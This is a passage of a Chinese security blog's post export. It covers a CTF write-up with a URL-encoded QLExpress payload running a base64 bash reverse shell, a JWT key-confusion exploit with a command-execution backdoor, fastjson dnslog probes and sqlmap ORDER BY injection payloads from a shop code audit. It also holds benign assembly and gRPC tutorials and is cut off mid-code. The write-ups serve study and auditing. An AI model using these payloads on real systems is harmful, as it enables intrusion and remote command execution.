发现这个确实可以执行表达式，并且cmd参数我们可控，但是看官方文档 https://github.com/alibaba/QLExpress 官方文档中有默认的表达式执行的黑名单，题目中过滤了process|runtime|javascript|\\\\+|char|\\\\\\\\|from|\\\\[|\\\\]|load 不能够进行拼接绕过，这里我们采用官方wp，利用URL编码绕过 对payload进行url编码 java.lang.Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMjMzMyAwPiYx}|{base64,-d}|{bash,-i}&quot;).getInputStream() 再利用java.net.URLDecoder.decode进行解码 具体 &quot;cmd&quot;:&quot;import javax.script.ScriptEngineManager;new ScriptEngineManager().getEngineByName(\\&quot;nashorn\\&quot;).eval(java.net.URLDecoder.decode(\\&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%6a%63%75%4d%43%34%77%4c%6a%45%76%4d%6a%4d%7a%4d%79%41%77%50%69%59%78%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29\\&quot;));&quot;, expimport requestsimport jsonurl = &quot;http://127.0.0.1:8080/exp&quot;payload = {&quot;cmd&quot;:&quot;import javax.script.ScriptEngineManager;new ScriptEngineManager().getEngineByName(\\&quot;nashorn\\&quot;).eval(java.net.URLDecoder.decode(\\&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%6a%63%75%4d%43%34%77%4c%6a%45%76%4d%6a%4d%7a%4d%79%41%77%50%69%59%78%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29\\&quot;));&quot;,&quot;x&quot;:&quot;hVanzhujiarandundunjiechan&quot;}header = {&quot;Content-Type&quot;: &quot;application/json&quot;}resp = requests.post(url=url, data=json.dumps(payload), headers=header)print(resp.text) 执行成功 HackThisBox这题给了docker以及源码 而且这题docker-compose启动之前，先自己随便写个private.pem文件放在config文件里，不然无法启动 整个网站使用了jwt的验证，并且是使用非对称加密RS256进行加密，而在解密的时候使用了对称加密算法HS256 这样有个什么问题呢，会造成密钥混淆攻击 JWT最常用的两种算法是HMAC和RSA。HMAC（对称加密算法）用同一个密钥对token进行签名和认证。而RSA（非对称加密算法）需要两个密钥，先用私钥加密生成JWT，然后使用其对应的公钥来解密验证。 如果将算法RS256修改为HS256（非对称密码算法=&gt;对称密码算法）呢？ 那么，后端代码会使用RS256的公钥作为密钥，然后使用HS256算法验证签名。由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。 源码里我们已经获得了公钥，所以可以伪造token 再看这个路由 router.post('/upload', function(req, res, next) { if(req.files.length !== 0) { var savePath = ''; if(req.auth.isAdmin === false) { var dirName = `./public/upload/${req.auth.home}/` fs.mkdir(dirName, (err)=&gt;{ if(err) { console.log('error') } else { console.log('ok') } }); savePath = path.join(dirName, req.files[0].originalname); } else if(req.auth.isAdmin === true) { savePath = req.auth.home; } fs.readFile(req.files[0].path, function(err, data) { if(err) { return res.status(500).send(&quot;error&quot;); } else { // 任意文件写入 fs.writeFileSync(savePath, data); } }); return res.status(200).send(&quot;file upload successfully&quot;); } else { return res.status(500).send(&quot;error&quot;); }}); 如果我们设置isAdmin=true就可以通过传入的req.auth.home，利用fs.writeFileSync(savePath, data);任意写入文件，我们可以覆盖index.js文件，写入一个后门 而这个writeFileSync和我们之前分析过的readFileSync一样，都可以通过url编码来绕过waf，将我们传入的pathname进行编码就可以绕过这个过滤 app.use(function(req, res, next) { if([req.body, req.query, req.auth, req.headers].some(function(item) { console.log(req.auth) return item &amp;&amp; /\\.\\.\\/|proc|public|routes|\\.js|cron|views/img.test(JSON.stringify(item)); })) { return res.status(403).send('illegal data.'); } else { next(); };}); 我们先伪造token服务 token.js var express = require('express');var fs = require(&quot;fs&quot;)var jwt = require(&quot;jsonwebtoken&quot;)var path = require('path')var app = express();var publicKey = fs.readFileSync('./src/config/public.pem');app.get('/', function(req, res, next) { const token = jwt.sign({username: &quot;admin&quot;, isAdmin: true, home: { href: &quot;c&quot;, origin: &quot;c&quot;, protocol: &quot;file:&quot;, hostname: &quot;&quot;, pathname: &quot;/app/%72%6f%75%74%65%73/index.%6a%73&quot; }}, publicKey, {algorithm: &quot;HS256&quot;}); res.send({token})})var server = app.listen(7000, function () { var host = server.address().address; var port = server.address().port; console.log(&quot;Address is http://%s:%s&quot;, host, port);}) 后门文件shell.js var express = require('express');const execSync = require('child_process').execSync;var router = express.Router();router.get('/', function(req, res, next) { var cmd = execSync(req.query.cmd); res.send(cmd.toString());});module.exports = router; 最后的exp import requestssess = requests.session()url = 'http://localhost:8082'hearder = {&quot;authorization&quot;:&quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaG9tZSI6eyJocmVmIjoiYyIsIm9yaWdpbiI6ImMiLCJwcm90b2NvbCI6ImZpbGU6IiwiaG9zdG5hbWUiOiIiLCJwYXRobmFtZSI6Ii9hcHAvJTcyJTZmJTc1JTc0JTY1JTczL2luZGV4LiU2YSU3MyJ9LCJpYXQiOjE2NjkzMDYzNDZ9.RdEQN3Kt0c_Fz_n9uJP3dTYZHWqdp6GoJ3Yd5YpZjl4&quot;}file = {&quot;file&quot;:(&quot;./shell.js&quot;,open(&quot;./shell.js&quot;,&quot;rb&quot;).read())}res = sess.post(url=url+&quot;/api/upload&quot;,files=file,headers=hearder)print(res.text) 然后就可以执行命令","link":"/2022/11/24/yjs/"},{"title":"王爽汇编LAB-7","text":"汇编实验七 assume cs:codesg data segment db '1975','1976','1977','1978','1979','1980','1981','1982','1983' db '1984','1985','1986','1987','1988','1989','1990','1991','1992' db '1993','1994','1995' ;以上是表示21年的21个字符串 dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514 dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5937000 ;以上是表示21年公司总收入的21个dword型数据 dw 3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226 dw 11542,14430,15257,17800 ;以上是表示21Ian公司雇员人数的21个word型数据 data ends table segment db 21 dup ('year summ ne ?? ')table endscodesg segmentstart: mov ax,data mov ds,ax mov ax,table mov es,ax xor bx,bx xor si,si xor di,di mov cx,21s: ;year mov ax,[bx] mov es:[di],ax mov ax,[bx+2] mov es:[di+2],ax ;space mov byte ptr es:[di+4],20h ;income mov ax,[bx+84] mov es:[di+5],ax mov ax,[bx+86] mov es:[di+7],ax mov byte ptr es:[di+9],20h ;people mov ax,[bx+168] mov es:[di+10],ax mov byte ptr es:[di+12],20h ;salary mov ax,[bx+84] mov dx,[bx+86] div word ptr ds:[si+168] mov es:[di+13],ax mov byte ptr es:[di+0fh],20h add di,16 add si,2 add bx,4loop s mov ax,4c00h int 21hcodesg endsend start 效果如图","link":"/2021/11/27/test/"},{"title":"GRPC学习","text":"介绍 微服务和单体架构单体架构弊端 紧耦合 单体应用程序中的服务模块是紧耦合的。业务逻辑纠缠不清，很难隔离应用程序，因此可扩展性成为一个挑战。 缓慢的构建和发布周期 由于代码库非常庞大，这会延缓应用程序的开发和测试周期的速度。 微服务解决了单体架构的弊端 但也有新的缺点 代码冗余 服务和服务之间调用，进程和进程之间调用 为了加快网络传输，在微服务中引入RPC（远程过程调用），通过自定义协议发起TCP调用 RPC框架是什么https://zhuanlan.zhihu.com/p/411315625 RPC 框架说白了就是让你可以像调用本地方法一样调用远程服务提供的方法，而不需要关心底层的通信细节。简单地说就让远程服务调用更加简单、透明。 RPC包含了客户端（Client）和服务端（Server） GRPChttps://grpc.io/docs/what-is-grpc/introduction/ grpc默认使用proto buffers，是谷歌一套成熟的开源的结构数据序列化机制 Protobuf安装安装protobuf brew install protobufprotoc --version //验证 安装go语言的protoc生成器 go install google.golang.org/protobuf/cmd/protoc-gen-go@latest Proto文件// 声明版本syntax = &quot;proto3&quot;;//option go_package = &quot;path;name&quot; path表示生成go的存放地址,自动生成目录,name表示go文件所属包名option go_package = &quot;.;service&quot;;//服务方法,接受客户端参数,返回服务端响应service SayHello { rpc SayHello(HelloRequest) returns (HelloResponse) {}}//类似结构体message HelloRequest { string username = 1; int64 code = 2;}message HelloResponse { string responseMsg = 1;} 利用命令生成 protoc --go_out=../rpc hello.protoprotoc --go-grpc_out=../rpc hello.proto 服务端代码实现package mainimport ( service &quot;LearnTest/rpc&quot; &quot;context&quot; &quot;fmt&quot; &quot;google.golang.org/grpc&quot; &quot;google.golang.org/grpc/reflection&quot; &quot;log&quot; &quot;net&quot; &quot;strconv&quot;)type server struct { service.UnimplementedSayHelloServer}func (s *server) SayHello(ctx context.Context, req *service.HelloRequest) (*service.HelloResponse, error) { fmt.Println(&quot;recv from &quot; + req.Username) return &amp;service.HelloResponse{ResponseMsg: &quot;hello &quot; + req.Username + &quot;\\nyour code is: &quot; + strconv.Itoa(int(req.Code))}, nil}func main() { lis, err := net.Listen(&quot;tcp&quot;, &quot;:2333&quot;) if err != nil { log.Fatalf(&quot;failed to listen: %v&quot;, err) } grpcServer := grpc.NewServer() service.RegisterSayHelloServer(grpcServer, &amp;server{}) reflection.Register(grpcServer) fmt.Println(&quot;Listening on port 2333...&quot;) grpcServer.Serve(lis)} 客户端代码实现package mainimport ( service &quot;LearnTest/rpc&quot; &quot;context&quot; &quot;fmt&quot; &quot;google.golang.org/grpc&quot; &quot;google.golang.org/grpc/credentials/insecure&quot;)func main() { conn, err := grpc.Dial(&quot;127.0.0.1:2333&quot;, grpc.WithTransportCredentials(insecure.NewCredentials())) if err != nil { return } defer conn.Close() client := service.NewSayHelloClient(conn) resp, _ := client.SayHello(context.Background(), &amp;service.HelloRequest{ Username: &quot;qqw&quot;, Code: 3377, }) fmt.Println(resp.GetResponseMsg())} 认证以及安全传输刚才写的代码是不安全的，在客户端中，我们可以发现，只要我们知道目标服务器的ip和端口就能够对它进行连接传输，所以我们要采取相关认证和安全的传输方式 gRPC 内默认提供了两种 内置的认证方式： 基于 CA 证书的 SSL/TLS 认证方式； 基于 Token 的认证方式。 gRPC 中的连接类型一共有以下 3 种： insecure connection：不使用 TLS 加密； server-side TLS：仅服务端 TLS 加密； mutual TLS：客户端、服务端都使用 TLS 加密。 如之前的连接就是不安全的 conn, err := grpc.Dial(&quot;127.0.0.1:2333&quot;, grpc.WithTransportCredentials(insecure.NewCredentials())) TLS认证实现参考 https://www.cnblogs.com/rickiyang/p/14981374.html 客户端CA证书 # 生成.key 私钥文件openssl genrsa -out ca.key 2048# 生成.csr 证书签名请求文件openssl req -new -key ca.key -out ca.csr# 自签名生成.crt 证书文件openssl req -new -x509 -days 3650 -key ca.key -out ca.crt 服务端证书 其中需要先复制本机的openssl.cnf文件到该目录，然后进行相关修改 # 生成.key 私钥文件openssl genrsa -out server.key 2048# 生成.csr 证书签名请求文件openssl req -new -subj &quot;/C=GB/L=Beijing/O=github/CN=qqw.com&quot; \\-key server.key -out server.csr -config openssl.cnf# 签名生成.crt 证书文件openssl x509 -req -sha256 -CA ca.crt -CAkey ca.key -CAcreateserial -days 365 \\-in server.csr -out server.crt -extensions v3_req -extfile openssl.cnf 修改相关代码 package mainimport ( service &quot;LearnTest/rpc&quot; &quot;context&quot; &quot;fmt&quot; &quot;google.golang.org/grpc&quot; &quot;google.golang.org/grpc/credentials&quot; &quot;google.golang.org/grpc/reflection&quot; &quot;log&quot; &quot;net&quot; &quot;strconv&quot;)type server struct { service.UnimplementedSayHelloServer}func (s *server) SayHello(ctx context.Context, req *service.HelloRequest) (*service.HelloResponse, error) { fmt.Println(&quot;recv from &quot; + req.Username) return &amp;service.HelloResponse{ResponseMsg: &quot;hello &quot; + req.Username + &quot;\\nyour code is: &quot; + strconv.Itoa(int(req.Code))}, nil}func main() { //服务端这里添加上证书和密钥 cert, _ := credentials.NewServerTLSFromFile(&quot;绝对路径/server.crt&quot;, &quot;绝对路径/server.key&quot;) lis, err := net.Listen(&quot;tcp&quot;, &quot;:2333&quot;) if err != nil { log.Fatalf(&quot;failed to listen: %v&quot;, err) } //服务端这里添加上证书和密钥 grpcServer := grpc.NewServer(grpc.Creds(cert)) service.RegisterSayHelloServer(grpcServer, &amp;server{}) reflection.Register(grpcServer) fmt.Println(&quot;Listening on port 2333...&quot;) grpcServer.Serve(lis)} package mainimport ( service &quot;LearnTest/rpc&quot; &quot;context&quot; &quot;fmt&quot; &quot;google.golang.org/grpc&quot; &quot;google.golang.org/grpc/credentials&quot;)func main() { //客户端这里添加证书，以及配置相关域名，若不是服务端规定的则不能通过认证 cert, _ := credentials.NewClientTLSFromFile(&quot;绝对路径/ca.crt&quot;, &quot;kk.qqw.com&quot;) conn, err := grpc.Dial(&quot;127.0.0.1:2333&quot;, grpc.WithTransportCredentials(cert)) if err != nil { return } defer conn.Close() client := service.NewSayHelloClient(conn) resp, _ := client.SayHello(context.Background(), &amp;service.HelloRequest{ Username: &quot;qqw&quot;, Code: 3377, }) fmt.Println(resp.GetResponseMsg())} Token认证实现这里再写一个token.proto文件 // 声明版本syntax = &quot;proto3&quot;;//option go_package = &quot;path;name&quot; path表示生成go的存放地址,name表示go文件所属包名option go_package = &quot;.;service&quot;;message LoginRequest { string username = 1; string password = 2;}message LoginResp { string status = 1; string token = 2;}message PingMessage { string greet = 1;}service TokenService { rpc Login(LoginRequest) returns (LoginResp) {} rpc Greet(PingMessage) returns (PingMessage) {}} protoc --go_out=../rpc token.protoprotoc --go-grpc_out=../rpc token.proto 采用jwt-go做token的验证 package tokenimport ( &quot;context&quot; &quot;fmt&quot; &quot;time&quot; &quot;github.com/dgrijalva/jwt-go&quot; &quot;google.golang.org/grpc/metadata&quot;)func CreateToken(userName string) (tokenString string) { token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{ &quot;iss&quot;: &quot;lora-app-server&quot;, &quot;aud&quot;: &quot;lora-app-server&quot;, &quot;nbf&quot;: time.Now().Unix(), &quot;exp&quot;: time.Now().Add(time.Hour).Unix(), &quot;sub&quot;: &quot;user&quot;, &quot;username&quot;: userName, }) tokenString, err := token.SignedString([]byte(&quot;qqw-1-sec-37&quot;)) if err != nil { panic(err) } return tokenString}// AuthToken 自定义认证type AuthToken struct { Token string}func (c AuthToken) GetRequestMetadata(ctx context.Context, uri ...string) (map[string]string, error) { return map[string]string{ &quot;authorization&quot;: c.Token, }, nil}func (c AuthToken) RequireTransportSecurity() bool { return false}// Claims defines the struct containing the token claims.type Claims struct { jwt.StandardClaims // Username defines the identity of the user. Username string `json:&quot;username&quot;`}// Step1. 从 context 的 metadata 中，取出 tokenfunc getTokenFromContext(ctx context.Context) (string, error) { md, ok := metadata.FromIncomingContext(ctx) if !ok { return &quot;&quot;, fmt.Errorf(&quot;ErrNoMetadataInContext&quot;) } // md 的类型是 type MD map[string][]string token, ok := md[&quot;authorization&quot;] if !ok || len(token) == 0 { return &quot;&quot;, fmt.Errorf(&quot;ErrNoAuthorizationInMetadata&quot;) } // 因此，token 是一个字符串数组，我们只用了 token[0] return token[0], nil}func CheckAuth(ctx context.Context) (username string) { tokenStr, err := getTokenFromContext(ctx) if err != nil { panic(&quot;get token from context error&quot;) } var clientClaims Claims token, err := jwt.ParseWithClaims(tokenStr, &amp;clientClaims, func(token *jwt.Token) (interface{}, error) { if token.Header[&quot;alg&quot;] != &quot;HS256&quot; { panic(&quot;ErrInvalidAlgorithm&quot;) } return []byte(&quot;qqw-1-sec-37&quot;), nil }) if err != nil { panic(&quot;jwt parse error&quot;) } if !token.Valid { panic(&quot;ErrInvalidToken&quot;) } return clientClaims.Username} 然后编写服务端代码 注意这个地方token_grpc.pb.go会自行编译出一个mustEmbedUnimplementedTokenServiceServer()方法 参考 type TokenServiceServer interface { Login(context.Context, *LoginRequest) (*LoginResp, error) Greet(context.Context, *PingMessage) (*PingMessage, error) mustEmbedUnimplementedTokenServiceServer()} 可以在编译时加参数取消这个方法 protoc --go_out=../rpc --go-grpc_out=require_unimplemented_servers=false:../rpc token.proto 或者通过结构体嵌套方式默认实现这个方法，否则在gprc服务端注册服务的时候会报错 package mainimport ( service &quot;LearnTest/rpc&quot; &quot;LearnTest/token&quot; &quot;context&quot; &quot;fmt&quot; &quot;google.golang.org/grpc&quot; &quot;google.golang.org/grpc/credentials&quot; &quot;google.golang.org/grpc/grpclog&quot; &quot;google.golang.org/grpc/reflection&quot; &quot;net&quot;)// LoggingInterceptor 日志拦截器func LoggingInterceptor(ctx context.Context, req interface{}, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (interface{}, error) { fmt.Printf(&quot;request gRPC method: %s, %v\\n&quot;, info.FullMethod, req) resp, err := handler(ctx, req) fmt.Printf(&quot;response gRPC method: %s, %v\\n&quot;, info.FullMethod, resp) return resp, err}type login struct { //通过结构体嵌套方式默认实现这个方法 service.UnimplementedTokenServiceServer}func (login *login) Login(ctx context.Context, request *service.LoginRequest) (resp *service.LoginResp, err error) { if request.Username == &quot;qqw&quot; &amp;&amp; request.Password == &quot;qqw&quot; { token := token.CreateToken(request.Username) return &amp;service.LoginResp{Status: &quot;200&quot;, Token: token}, nil } return &amp;service.LoginResp{Status: &quot;401&quot;, Token: &quot;&quot;}, nil}func (login *login) Greet(ctx context.Context, request *service.PingMessage) (resp *service.PingMessage, err error) { auth := token.CheckAuth(ctx) return &amp;service.PingMessage{Greet: auth}, nil}func main() { lis, err := net.Listen(&quot;tcp&quot;, &quot;:2333&quot;) if err != nil { fmt.Printf(&quot;failed to listen: %v\\n&quot;, err) return } // TLS认证 creds, err := credentials.NewServerTLSFromFile(&quot;/Users/liuke/GolandProjects/LearnTest/ssl/server.crt&quot;, &quot;/Users/liuke/GolandProjects/LearnTest/ssl/server.key&quot;) if err != nil { grpclog.Fatalf(&quot;Failed to generate credentials %v&quot;, err) } //开启TLS认证 注册拦截器 s := grpc.NewServer(grpc.Creds(creds), grpc.UnaryInterceptor(LoggingInterceptor)) // 创建gRPC服务器 service.RegisterTokenServiceServer(s, &amp;login{}) // 在gRPC服务端注册服务 reflection.Register(s) //在给定的gRPC服务器上注册服务器反射服务 // Serve方法在list上接受传入连接，为每个连接创建一个ServerTransport和server的goroutine。 // 该goroutine读取gRPC请求，然后调用已注册的处理程序来响应它们。 fmt.Println(&quot;Listening on port 2333...&quot;) err = s.Serve(lis)} 接着编写客户端代码 package mainimport ( service &quot;LearnTest/rpc&quot; Token &quot;LearnTest/token&quot; &quot;context&quot; &quot;fmt&quot; &quot;google.golang.org/grpc&quot; &quot;google.golang.org/grpc/credentials&quot; &quot;google.golang.org/grpc/grpclog&quot;)func main() { var err error var opts []grpc.DialOption // TLS连接 creds, err := credentials.NewClientTLSFromFile(&quot;/Users/liuke/GolandProjects/LearnTest/ssl/ca.crt&quot;, &quot;www.qqw.com&quot;) if err != nil { grpclog.Fatalf(&quot;Failed to create TLS credentials %v&quot;, err) return } opts = append(opts, grpc.WithTransportCredentials(creds)) //连接服务端 conn, err := grpc.Dial(&quot;:2333&quot;, opts...) if err != nil { fmt.Printf(&quot;failed to connect: %v\\n&quot;, err) return } defer conn.Close() c := service.NewTokenServiceClient(conn) // 调用登录方法,获得token r, err := c.Login(context.Background(), &amp;service.LoginRequest{Username: &quot;qqw1&quot;, Password: &quot;qqw&quot;}) if err != nil { fmt.Printf(&quot;could not login: %v\\n&quot;, err) return } requestToken := new(Token.AuthToken) requestToken.Token = r.Token //连接服务端 conn, err = grpc.Dial(&quot;:2333&quot;, grpc.WithTransportCredentials(creds), grpc.WithPerRPCCredentials(requestToken)) if err != nil { fmt.Printf(&quot;failed to connect: %v\\n&quot;, err) return } defer conn.Close() c = service.NewTokenServiceClient(conn) greet, err := c.Greet(context.Background(), &amp;service.PingMessage{Greet: &quot;调用greet&quot;}) if err != nil { fmt.Printf(&quot;could not greet: %v\\n&quot;, err) return } fmt.Printf(&quot;Greeting: %s, %s\\n&quot;, r.Token, greet)} 正常登录请求返回200，登录认证不通过返回401 参考https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzIzNDcwNjQxMg==&amp;action=getalbum&amp;album_id=1705166100159594498&amp;scene=173&amp;from_msgid=2247484803&amp;from_itemidx=1&amp;count=3&amp;nolastread=1#wechat_redirect https://www.bilibili.com/video/BV1S24y1U7Xp?vd_source=81993e830ebcf48a17d58eb0b7f3a7c2","link":"/2023/03/23/sturpc/"},{"title":"迷你天猫商城系统审计","text":"前言开始学习审计一些开源系统 分析首先从一些依赖入手，看看有没有nday可以打 &lt;!-- log4j2 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.10.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-api&lt;/artifactId&gt; &lt;version&gt;2.10.0&lt;/version&gt; &lt;/dependency&gt;&lt;!-- Json --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.58&lt;/version&gt; &lt;/dependency&gt; 有log4j2和fastjson，而且都是满足漏洞利用的版本条件 log4j全局搜索logger.info 可以利用的在普通用户上传头像处以及管理员上传头像处，还有新增分类上传图片处都有 // 上传产品类型图片-ajax @ResponseBody @RequestMapping(value = &quot;admin/uploadCategoryImage&quot;, method = RequestMethod.POST, produces = &quot;application/json;charset=utf-8&quot;) public String uploadCategoryImage(@RequestParam MultipartFile file, HttpSession session) { String originalFileName = file.getOriginalFilename(); //漏洞点 logger.info(&quot;获取图片原始文件名: {}&quot;, originalFileName); String extension = originalFileName.substring(originalFileName.lastIndexOf('.')); String fileName = UUID.randomUUID() + extension; String filePath = session.getServletContext().getRealPath(&quot;/&quot;) + &quot;res/images/item/categoryPicture/&quot; + fileName; logger.info(&quot;文件上传路径：{}&quot;, filePath); JSONObject object = new JSONObject(); try { logger.info(&quot;文件上传中...&quot;); file.transferTo(new File(filePath)); logger.info(&quot;文件上传完成&quot;); object.put(&quot;success&quot;, true); object.put(&quot;fileName&quot;, fileName); } catch (IOException e) { logger.warn(&quot;文件上传失败!&quot;); e.printStackTrace(); object.put(&quot;success&quot;, false); } return object.toJSONString();} fastjsonfastjson具体我还没去跟过链子，但是之前粗略的看了下文章，它是通过jndi注入导致的RCE，在反序列化过程中会使用JSON.parse() 和JSON.parseObject() 这两个方法. parseObject() 相比parse()多执行了 JSON.toJSON(obj)，在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。 于是我们就可以全局搜索这两个方法 可以定位到ProductController，在添加产品信息和更新产品信息处都有 @RequestParam String propertyJson/* 产品属性JSON */,@RequestParam String propertyAddJson/* 产品添加属性JSON */,@RequestParam String propertyUpdateJson/* 产品更新属性JSON */,JSONObject object = JSON.parseObject(propertyJson);JSONObject object = JSON.parseObject(propertyAddJson);object = JSON.parseObject(propertyUpdateJson); 利用poc验证{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;} 其他可利用的poc {&quot;zeo&quot;:{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}}{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}{&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;}}{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}}&quot;&quot;}{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}:&quot;aaa&quot;}Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}]Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}:0 常规漏洞审计sql注入我们可以知道是用mybatis操作数据库的，以之前审计sql注入的经验，我们可以想到搜索${这种关键字，看是否有没有做过滤的，还有就是注意order by, like等关键字，他们采用#{}会报错，所以如果没做好过滤就会造成sql注入 首先我们在UserMapper.xml中找到 &lt;select id=&quot;select&quot; resultMap=&quot;userMap&quot;&gt; ...&lt;if test=&quot;orderUtil != null&quot;&gt; ORDER BY ${orderUtil.orderBy}&lt;if test=&quot;orderUtil.isDesc&quot;&gt;desc &lt;/if&gt; &lt;/if&gt; ... 我们定位到dao层的userMap的select @Mapperpublic interface UserMapper { Integer insertOne(@Param(&quot;user&quot;) User user); Integer updateOne(@Param(&quot;user&quot;) User user); List&lt;User&gt; select(@Param(&quot;user&quot;) User user, @Param(&quot;orderUtil&quot;) OrderUtil orderUtil, @Param(&quot;pageUtil&quot;) PageUtil pageUtil); User selectOne(@Param(&quot;user_id&quot;) Integer user_id); User selectByLogin(@Param(&quot;user_name&quot;) String user_name, @Param(&quot;user_password&quot;) String user_password); Integer selectTotal(@Param(&quot;user&quot;) User user);} 然后接着cmd+B，找谁实现了select @Overridepublic List&lt;User&gt; getList(User user, OrderUtil orderUtil, PageUtil pageUtil) { return userMapper.select(user,orderUtil,pageUtil);} 再find usages找谁调用了这个getList 有两处但是goUserManagePage中的getList，它传入的orderUtil为null public String goUserManagePage(HttpSession session, Map&lt;String, Object&gt; map){ logger.info(&quot;获取前十条用户信息&quot;); PageUtil pageUtil = new PageUtil(0, 10); List&lt;User&gt; userList = userService.getList(null, null, pageUtil); ... 我们看下面一处 OrderUtil orderUtil = null;if (orderBy != null) { logger.info(&quot;根据{}排序，是否倒序:{}&quot;,orderBy,isDesc); orderUtil = new OrderUtil(orderBy, isDesc);}JSONObject object = new JSONObject();logger.info(&quot;按条件获取第{}页的{}条用户&quot;, index + 1, count);PageUtil pageUtil = new PageUtil(index, count);List&lt;User&gt; userList = userService.getList(user, orderUtil, pageUtil); orderBy和isDesc在Url中传入，我们可控 @RequestParam(required = false) String orderBy/* 排序字段 */,@RequestParam(required = false,defaultValue = &quot;true&quot;) Boolean isDesc/* 是否倒序 */, 除了这个地方，我们按照同样的办法，可以找到后台还有个产品查询也存在相同的注入 //按条件查询产品-ajax @ResponseBody @RequestMapping(value = &quot;admin/product/{index}/{count}&quot;, .... OrderUtil orderUtil = null; if (orderBy != null) { logger.info(&quot;根据{}排序，是否倒序:{}&quot;,orderBy,isDesc); orderUtil = new OrderUtil(orderBy, isDesc); } JSONObject object = new JSONObject(); logger.info(&quot;按条件获取第{}页的{}条产品&quot;, index + 1, count); PageUtil pageUtil = new PageUtil(index, count); List&lt;Product&gt; productList = productService.getList(product, product_isEnabled_array, orderUtil, pageUtil); ---Parameter: #1* (URI) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: http://localhost:8088/tmall/admin/product/0/10?product_name=1&amp;category_id=0&amp;product_sale_price=&amp;product_price=&amp;product_isEnabled_array=0&amp;product_isEnabled_array=1&amp;product_isEnabled_array=2&amp;orderBy=(SELECT (CASE WHEN (8468=8468) THEN '' ELSE (SELECT 2634 UNION SELECT 5782) END))&amp;isDesc=true Type: time-based blind Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace Payload: http://localhost:8088/tmall/admin/product/0/10?product_name=1&amp;category_id=0&amp;product_sale_price=&amp;product_price=&amp;product_isEnabled_array=0&amp;product_isEnabled_array=1&amp;product_isEnabled_array=2&amp;orderBy=(CASE WHEN (7841=7841) THEN SLEEP(5) ELSE 7841 END)&amp;isDesc=true--- 还有一个前台的注入，在查询产品处，原理也是一样的，但是这个只能跑时间盲注。 @RequestMapping(value = &quot;product/{index}/{count}&quot;, method = RequestMethod.GET) public String searchProduct(HttpSession session, Map&lt;String, Object&gt; map, @PathVariable(&quot;index&quot;) Integer index/* 页数 */, @PathVariable(&quot;count&quot;) Integer count/* 行数*/, @RequestParam(value = &quot;category_id&quot;, required = false) Integer category_id/* 分类ID */, @RequestParam(value = &quot;product_name&quot;, required = false) String product_name/* 产品名称 */, @RequestParam(required = false) String orderBy/* 排序字段 */, @RequestParam(required = false, defaultValue = &quot;true&quot;) Boolean isDesc/* 是否倒序 */) { logger.info(&quot;整合搜索信息&quot;); Product product = new Product(); OrderUtil orderUtil = null; String searchValue = null; Integer searchType = null; if (category_id != null) { product.setProduct_category(new Category().setCategory_id(category_id)); searchType = category_id; } if (product_name != null) { product.setProduct_name(product_name); } if (orderBy != null) { logger.info(&quot;根据{}排序，是否倒序:{}&quot;, orderBy, isDesc); orderUtil = new OrderUtil(orderBy, isDesc); } ... ...productList = productService.getList(product, new Byte[]{0, 2}, 